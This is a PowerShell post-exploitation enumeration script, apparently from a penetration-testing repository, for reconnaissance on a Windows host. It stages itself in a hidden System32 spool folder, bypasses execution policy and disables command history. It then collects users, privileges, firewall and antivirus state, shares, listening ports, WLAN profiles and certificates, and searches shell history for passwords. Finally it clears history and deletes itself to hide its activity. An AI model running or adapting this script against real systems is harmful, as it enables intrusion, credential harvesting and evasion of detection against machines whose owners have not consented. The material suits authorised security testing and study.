<#
Download script:
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/winenum.ps1", "C:\Windows\System32\spool\drivers\color\winenum.ps1")
#>
################################## Setup ##################################
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Set-PSReadlineOption -HistorySaveStyle SaveNothing
attrib +h winenum.ps1
Unblock-File -Path .\winenum.ps1
New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
Unblock-File -Path "C:\Windows\System32\spool\drivers\color\1.txt"
New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\2.txt"
Unblock-File -Path "C:\Windows\System32\spool\drivers\color\2.txt"
attrib +h 1.txt
attrib +h 2.txt
################################## Finshed Setup ##################################
Write-Output "################################## Start ##################################" | Out-File -FilePath .\1.txt -Append  
Get-Date | Out-File -FilePath .\1.txt -Append 
Write-Output "###########################################################################" | Out-File -FilePath .\1.txt -Append
Write-Output "################################## User Data ##################################" | Out-File -FilePath .\1.txt -Append
Write-Output "[+] Hostname:"
hostname | Out-File -FilePath .\1.txt -Append  
Write-Output "[+] Whoami:"
whoami | Out-File -FilePath .\1.txt -Append
Write-Output "[+] Local Users:"
Get-LocalUser | Out-File -FilePath .\1.txt -Append  
Write-Output "[+] Owner of C:\"
Get-Acl C:\ | Out-File -FilePath .\1.txt -Append  
Write-Output "[+] User Accounts for current Domain:"
net user | Out-File -FilePath .\1.txt -Append  
Write-Output "[+] TimeZone:"
Get-TimeZone | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] PC Name:"
$env:COMPUTERNAME | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] User Name:"
$env:USERNAME | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] User Profile Location:"
$env:USERPROFILE | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] User Domain:"
$env:USERDOMAIN | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## PC Info ##################################" | Out-File -FilePath .\1.txt -Append
Write-Output "[+] PC Acrh Type:"
wmic os get osarchitecture | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] PC Name + Version (Short):"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] PC Information (extended):"
systeminfo | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] Powershell Version:"
Get-Host | Select-Object Version | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Privs ##################################" | Out-File -FilePath .\1.txt -Append
whoami /priv | Out-File -FilePath .\1.txt -Append 
whoami /groups | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Firewall Info ##################################" | Out-File -FilePath .\1.txt -Append
netsh Advfirewall show allprofiles | Out-File -FilePath .\1.txt -Append 
netsh firewall show state | Out-File -FilePath .\1.txt -Append 
netsh firewall show config | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Defender Info ##################################" | Out-File -FilePath .\1.txt -Append
Write-Output "[+] AntiVirus Name:"
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more | Out-File -FilePath .\1.txt -Append
Write-Output "[+] Firewall Info:"
Get-MpComputerStatus | Out-File -FilePath .\1.txt -Append
Write-Output "################################## IP ##################################" | Out-File -FilePath .\1.txt -Append
ipconfig /all | Out-File -FilePath .\1.txt -Append  
Write-Output "################################## Passwords ##################################" | Out-File -FilePath .\1.txt -Append
Write-Output "[+] Passwords for user accounts enabled or not:"
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] Password string found in logs:"
Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String password  | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Shares ##################################" | Out-File -FilePath .\1.txt -Append
net share | Out-File -FilePath .\1.txt -Append  
Write-Output "################################## Execution Policy ##################################" | Out-File -FilePath .\1.txt -Append
Get-ExecutionPolicy -list | Out-File -FilePath .\1.txt -Append  
Write-Output "################################## Scheduled Tasks ##################################" | Out-File -FilePath .\1.txt -Append
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Format-Table TaskName,TaskPath,State | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Backup Files ##################################" | Out-File -FilePath .\1.txt -Append
Get-ChildItem -Path C: -Include .bak -File -Recurse -ErrorAction SilentlyContinue | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Patches ##################################" | Out-File -FilePath .\1.txt -Append
Get-Hotfix | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Hidden Files ##################################" | Out-File -FilePath .\1.txt -Append
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Running Processes ##################################" | Out-File -FilePath .\1.txt -Append
Get-Process | Out-File -FilePath .\1.txt -Append 
# Write ports to check
Write-Output "Scanning Top 20 Open Ports..." | Out-File -FilePath .\2.txt -Append 
Write-Output "21" | Out-File -FilePath .\2.txt -Append 
Write-Output "22" | Out-File -FilePath .\2.txt -Append
Write-Output "23" | Out-File -FilePath .\2.txt -Append 
Write-Output "25" | Out-File -FilePath .\2.txt -Append 
Write-Output "53" | Out-File -FilePath .\2.txt -Append 
Write-Output "80" | Out-File -FilePath .\2.txt -Append 
Write-Output "110" | Out-File -FilePath .\2.txt -Append 
Write-Output "111" | Out-File -FilePath .\2.txt -Append 
Write-Output "135" | Out-File -FilePath .\2.txt -Append 
Write-Output "143" | Out-File -FilePath .\2.txt -Append 
Write-Output "443" | Out-File -FilePath .\2.txt -Append 
Write-Output "445" | Out-File -FilePath .\2.txt -Append 
Write-Output "993" | Out-File -FilePath .\2.txt -Append 
Write-Output "996" | Out-File -FilePath .\2.txt -Append 
Write-Output "1723" | Out-File -FilePath .\2.txt -Append 
Write-Output "2049" | Out-File -FilePath .\2.txt -Append
Write-Output "3306" | Out-File -FilePath .\2.txt -Append 
Write-Output "3389" | Out-File -FilePath .\2.txt -Append 
Write-Output "5900" | Out-File -FilePath .\2.txt -Append 
Write-Output "8080" | Out-File -FilePath .\2.txt -Append 
Write-Output "################################## Open Ports ##################################" | Out-File -FilePath .\1.txt -Append
$system_ports = Get-NetTCPConnection -State Listen

$text_port = Get-Content -Path C:\Windows\System32\spool\drivers\color\2.txt

foreach($port in $text_port){

    if($port -in $system_ports.LocalPort){
        Write-Output $port" = OPEN" | Out-File -FilePath .\1.txt -Append 
     }

}
Write-Output "################################## Msic. ##################################" | Out-File -FilePath .\1.txt -Append
Write-Output "[+] Previous Connections to WLAN:" | Out-File -FilePath .\1.txt -Append 
netsh wlan show profile | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] Users Home Folders:" | Out-File -FilePath .\1.txt -Append 
Get-ChildItem $home | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] Get Certificates:" | Out-File -FilePath .\1.txt -Append 
Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert | Out-File -FilePath .\1.txt -Append 
Write-Output "[+] Show Available Logs:" | Out-File -FilePath .\1.txt -Append 
Get-Eventlog -list | Out-File -FilePath .\1.txt -Append 
Write-Output "##############################################################################" | Out-File -FilePath .\1.txt -Append
Get-Date | Out-File -FilePath .\1.txt -Append 
Write-Output "################################## Finished ##################################" | Out-File -FilePath .\1.txt -Append  
attrib -h 1.txt
attrib -h 2.txt
Remove-Item 2.txt -Force
attrib -h winenum.ps1
Clear-History
Clear-Host
Remove-Item winenum.ps1 -Force 
